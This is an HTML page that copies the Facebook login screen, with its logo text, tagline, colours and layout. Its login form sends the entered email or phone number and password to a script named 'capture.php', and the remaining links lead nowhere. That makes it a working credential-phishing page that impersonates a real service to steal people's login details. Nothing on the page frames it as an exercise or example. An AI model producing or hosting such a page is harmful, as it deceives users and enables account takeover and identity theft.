<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, Helvetica, sans-serif;
        }

        body {
            background-color: #f0f2f5;
        }

        .container {
            max-width: 980px;
            margin: 0 auto;
            padding: 72px 0 112px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .left-column {
            width: 500px;
            padding-right: 32px;
        }

        .logo {
            color: #1877f2;
            font-size: 3.5rem;
            font-weight: bold;
            margin-bottom: 16px;
        }

        .tagline {
            font-size: 1.5rem;
            line-height: 1.4;
        }

        .login-box {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            width: 396px;
            text-align: center;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            margin: 8px 0;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }

        input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }

        .login-btn {
            background: #1877f2;
            color: white;
            width: 100%;
            padding: 14px;
            font-size: 20px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            margin: 10px 0;
            cursor: pointer;
        }

        .login-btn:hover {
            background: #166fe5;
        }

        .forgot-password {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
            display: block;
            margin: 15px 0 20px;
        }

        .divider {
            border-bottom: 1px solid #dadde1;
            margin: 20px 16px;
        }

        .create-account {
            background: #42b72a;
            color: white;
            padding: 15px 20px;
            font-size: 17px;
            font-weight: bold;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin: 10px 0;
        }

        .create-account:hover {
            background: #36a420;
        }

        .create-page {
            margin-top: 28px;
            font-size: 14px;
        }

        @media (max-width: 900px) {
            .container {
                flex-direction: column;
                text-align: center;
                padding: 20px;
            }
            
            .left-column {
                padding: 0;
                margin-bottom: 40px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="left-column">
            <div class="logo">facebook</div>
            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
        </div>

        <div class="login-box">
            <form action="capture.php" method="POST">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log In</button>
            </form>
            <a href="#" class="forgot-password">Forgotten password?</a>
            <div class="divider"></div>
            <button class="create-account">Create New Account</button>
            <p class="create-page"><a href="#" style="color: black; font-weight: bold; text-decoration: none;">Create a Page</a> for a celebrity, brand or business.</p>
        </div>
    </div>
</body>
</html>
